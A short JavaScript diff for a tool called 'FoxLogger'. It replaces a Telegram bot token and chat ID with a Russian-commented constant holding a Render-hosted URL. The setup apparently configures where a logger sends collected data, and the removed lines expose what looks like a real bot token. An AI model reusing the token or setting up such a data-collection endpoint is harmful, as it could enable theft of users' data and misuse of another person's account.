@@ -1,2 +1,3 @@
-const TELEGRAM_BOT_TOKEN = "8916079717:AAFIrsjINbXmyyWZCmQGHak6DnjHGbi6-Xk";
-const TELEGRAM_CHAT_ID = "8995427762";
+// ========== НАСТРОЙКИ FOXLOGGER ==========
+// ТВОЙ URL НА RENDER (ЗАМЕНИ НА СВОЙ)
+const YOUR_RENDER_URL = "https://drwizzard3-5.onrender.com";
